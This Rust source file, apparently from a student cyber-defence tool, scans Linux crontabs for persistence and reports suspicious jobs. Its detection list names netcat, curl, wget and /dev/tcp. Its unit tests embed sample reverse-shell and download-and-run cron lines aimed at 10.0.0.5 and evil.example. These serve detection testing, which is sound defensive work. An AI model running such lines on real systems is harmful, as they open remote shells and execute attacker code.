// =============================================================================
// PinnacleCyPat - Scheduled task audit (Linux)
// Copyright 2026 Maxwell McCormick
// SPDX-License-Identifier: Apache-2.0
// =============================================================================

//! Reports cron jobs and systemd timers that look like persistence.
//!
//! Cron is the most common way a planted backdoor survives a reboot, and it is
//! easy to miss because there are six places to look: `/etc/crontab`, the four
//! `cron.*` directories, and per-user crontabs under
//! `/var/spool/cron/crontabs`. A competitor checking only `crontab -l` sees
//! their own user's jobs and nothing else.
//!
//! **Everything here is reported, never disabled.** A cron job is a single line
//! whose meaning depends entirely on context: `apt-get update` at 3am is
//! routine, and the same line with a different `PATH` above it is not. Deciding
//! automatically would remove the image's own maintenance jobs as often as an
//! attacker's, and the competitor is far better placed to judge. What this task
//! is for is making sure they see all six places.

use pinnacle_core::models::{SystemInfo, TaskResult};
use pinnacle_core::task::Task;
use pinnacle_core::{command, impl_task_meta, remediation, ui};

use crate::file_ops;
use async_trait::async_trait;
use std::path::Path;

/// Where cron jobs live.
const CRON_LOCATIONS: &[&str] = &[
    "/etc/crontab",
    "/etc/cron.d",
    "/etc/cron.hourly",
    "/etc/cron.daily",
    "/etc/cron.weekly",
    "/etc/cron.monthly",
    "/var/spool/cron/crontabs",
];

/// Fragments that turn an ordinary job into one worth looking at.
///
/// Each is a way of fetching and running code, or of opening a shell - the
/// things a maintenance job has no reason to do.
const SUSPICIOUS_FRAGMENTS: &[(&str, &str)] = &[
    ("curl", "fetches something from the network"),
    ("wget", "fetches something from the network"),
    ("nc ", "netcat - the classic reverse shell"),
    ("ncat", "netcat - the classic reverse shell"),
    ("/dev/tcp/", "a bash reverse shell needs no binary at all"),
    ("bash -i", "an interactive shell from a scheduled job"),
    ("sh -i", "an interactive shell from a scheduled job"),
    (
        "base64 -d",
        "decodes a payload rather than running a command",
    ),
    ("| sh", "pipes downloaded text straight into a shell"),
    ("| bash", "pipes downloaded text straight into a shell"),
    ("python -c", "runs inline code rather than a script"),
    ("python3 -c", "runs inline code rather than a script"),
    ("perl -e", "runs inline code rather than a script"),
    ("chmod +s", "sets the setuid bit"),
    ("useradd", "creates an account on a schedule"),
    ("/tmp/", "runs something out of a world-writable directory"),
];

pub struct ScheduledTasksAuditTask {
    name: String,
    description: String,
    dry_run: bool,
}

impl ScheduledTasksAuditTask {
    pub fn new() -> Self {
        Self {
            name: "Scheduled Tasks Audit".to_string(),
            description: "Report cron jobs and timers that look like persistence".to_string(),
            dry_run: false,
        }
    }
}

impl Default for ScheduledTasksAuditTask {
    fn default() -> Self {
        Self::new()
    }
}

/// Why this line is worth looking at, if it is.
pub fn suspicion(line: &str) -> Option<&'static str> {
    if !file_ops::is_active(line) {
        return None;
    }
    let lower = line.to_lowercase();
    SUSPICIOUS_FRAGMENTS
        .iter()
        .find(|(fragment, _)| lower.contains(fragment))
        .map(|(_, why)| *why)
}

/// One job worth reporting.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct Finding {
    pub source: String,
    pub line: String,
    pub why: &'static str,
}

/// Scan one file's contents for suspicious jobs.
pub fn scan_text(source: &str, text: &str) -> Vec<Finding> {
    text.lines()
        .filter_map(|line| {
            suspicion(line).map(|why| Finding {
                source: source.to_string(),
                line: line.trim().to_string(),
                why,
            })
        })
        .collect()
}

async fn scan_path(path: &Path, findings: &mut Vec<Finding>) {
    if path.is_file() {
        if let Ok(text) = tokio::fs::read_to_string(path).await {
            findings.extend(scan_text(&path.to_string_lossy(), &text));
        }
        return;
    }
    let Ok(mut entries) = tokio::fs::read_dir(path).await else {
        return;
    };
    while let Ok(Some(entry)) = entries.next_entry().await {
        let child = entry.path();
        if child.is_file()
            && let Ok(text) = tokio::fs::read_to_string(&child).await
        {
            findings.extend(scan_text(&child.to_string_lossy(), &text));
        }
    }
}

#[async_trait]
impl Task for ScheduledTasksAuditTask {
    impl_task_meta!();

    async fn read_system_state(&mut self) -> SystemInfo {
        let (_ok, out, _e) = command::execute(
            "systemctl",
            Some("list-timers --all --no-legend --no-pager"),
        )
        .await;
        SystemInfo {
            raw_output: Some(out),
            ..Default::default()
        }
    }

    async fn execute(&mut self) -> TaskResult {
        let mut result = TaskResult {
            task_name: self.name.clone(),
            success: true,
            ..Default::default()
        };

        let mut findings: Vec<Finding> = Vec::new();
        for location in CRON_LOCATIONS {
            let path = Path::new(location);
            if path.exists() {
                scan_path(path, &mut findings).await;
            }
        }

        result.items_attempted = findings.len() as i32;

        if findings.is_empty() {
            remediation::record_finding(
                "scheduled jobs",
                "no cron job fetches or executes code from the network",
                true,
                &format!("searched {}", CRON_LOCATIONS.join(", ")),
            );
            result.message = "No suspicious scheduled jobs found.".to_string();
            return result;
        }

        for finding in &findings {
            ui::markup_line(&format!(
                "[yellow]⚠ {}[/]\n    [dim]{}[/]\n    [dim]{}[/]",
                ui::escape(&finding.source),
                ui::escape(&finding.line),
                ui::escape(finding.why)
            ));
        }

        // Reported, never disabled - see the module comment. Recording it as a
        // finding rather than a fix is the honest shape: nothing was changed,
        // and the ledger should not suggest otherwise.
        remediation::record_finding(
            "scheduled jobs",
            "no cron job fetches or executes code from the network",
            false,
            &format!(
                "{} jobs worth reviewing: {}",
                findings.len(),
                findings
                    .iter()
                    .map(|f| f.source.as_str())
                    .collect::<Vec<_>>()
                    .join(", ")
            ),
        );

        result.message = format!(
            "{} scheduled jobs need review. Nothing was disabled - a cron line's meaning \
             depends on context this tool cannot see.",
            findings.len()
        );
        result
    }

    async fn verify(&mut self) -> bool {
        // An audit that changes nothing has nothing to verify. Returning false
        // because findings exist would report the task as failed for having
        // done its job.
        true
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    /// A real reverse shell, as it appears in a planted crontab.
    #[test]
    fn a_reverse_shell_is_found() {
        let text = "* * * * * root bash -i >& /dev/tcp/10.0.0.5/4444 0>&1\n";
        let findings = scan_text("/etc/crontab", text);
        assert_eq!(findings.len(), 1);
        assert!(findings[0].line.contains("/dev/tcp/"));
    }

    #[test]
    fn a_download_and_run_job_is_found() {
        let text = "0 3 * * * root curl -s http://evil.example/x.sh | sh\n";
        assert_eq!(scan_text("/etc/cron.d/backup", text).len(), 1);
    }

    /// The false positive that would matter most: the image's own maintenance
    /// jobs must not be flagged, or the reader learns to ignore this task.
    #[test]
    fn ordinary_maintenance_jobs_are_not_flagged() {
        let text = "\
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || run-parts --report /etc/cron.daily
30 3    * * *   root    /usr/lib/php/sessionclean
";
        assert!(scan_text("/etc/crontab", text).is_empty());
    }

    /// A commented-out job does not run, and flagging it would mean reporting
    /// the example lines every stock crontab ships with.
    #[test]
    fn commented_lines_are_not_jobs() {
        let text =
            "# * * * * * root curl http://example.com | sh\n# m h dom mon dow user command\n";
        assert!(scan_text("/etc/crontab", text).is_empty());
    }

    #[test]
    fn the_reason_is_recorded_with_the_finding() {
        let findings = scan_text(
            "/etc/crontab",
            "* * * * * root nc -e /bin/sh 10.0.0.5 4444\n",
        );
        assert_eq!(findings.len(), 1);
        assert!(!findings[0].why.is_empty());
        assert_eq!(findings[0].source, "/etc/crontab");
    }

    /// All six places a cron job can hide. A competitor running `crontab -l`
    /// sees one of them.
    #[test]
    fn every_cron_location_is_searched() {
        for expected in [
            "/etc/crontab",
            "/etc/cron.d",
            "/etc/cron.daily",
            "/var/spool/cron/crontabs",
        ] {
            assert!(
                CRON_LOCATIONS.contains(&expected),
                "{expected} is not searched"
            );
        }
    }
}
